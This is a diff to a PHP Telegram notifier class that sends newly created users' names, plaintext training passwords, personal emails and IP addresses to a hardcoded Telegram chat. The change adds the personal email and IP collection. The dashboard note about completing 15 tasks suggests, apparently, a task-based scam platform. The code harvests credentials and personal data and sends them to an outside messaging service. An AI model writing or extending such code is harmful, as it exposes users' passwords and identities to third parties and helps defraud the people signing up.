@@ -9,14 +9,35 @@ class TelegramNotifier {
         $this->chatId = '7844108983';
     }
 
-    public function sendTrainingCredentials($userFullName, $trainingEmail, $trainingPassword) {
+    private function getUserIP() {
+        $ipAddress = '';
+        if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
+            $ipAddress = $_SERVER['HTTP_CLIENT_IP'];
+        } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+            $ipAddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
+        } else {
+            $ipAddress = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
+        }
+        return $ipAddress;
+    }
+
+    public function sendTrainingCredentials($userFullName, $personalEmail, $trainingEmail, $trainingPassword, $ipAddress = null) {
+        if (!$ipAddress) {
+            $ipAddress = $this->getUserIP();
+        }
+
         $message = "🎓 NEW TRAINING ACCOUNT CREATED\n\n";
-        $message .= "👤 User: " . $userFullName . "\n";
+        $message .= "👤 User Name: " . $userFullName . "\n";
+        $message .= "📧 Personal Email: " . $personalEmail . "\n";
+        $message .= "📍 IP Address: " . $ipAddress . "\n";
+        $message .= "━━━━━━━━━━━━━━━━━━━━━\n";
+        $message .= "🎯 TRAINING CREDENTIALS\n";
         $message .= "📧 Training Email: " . $trainingEmail . "\n";
-        $message .= "🔐 Password: " . $trainingPassword . "\n\n";
+        $message .= "🔐 Training Password: " . $trainingPassword . "\n";
+        $message .= "━━━━━━━━━━━━━━━━━━━━━\n";
         $message .= "⏰ Created: " . date('Y-m-d H:i:s') . "\n";
         $message .= "━━━━━━━━━━━━━━━━━━━━━\n";
-        $message .= "Note: User must complete 15 tasks to unlock main dashboard.";
+        $message .= "⚠️ Note: User must complete 15 tasks to unlock main dashboard.";
 
         return $this->sendMessage($message);
     }
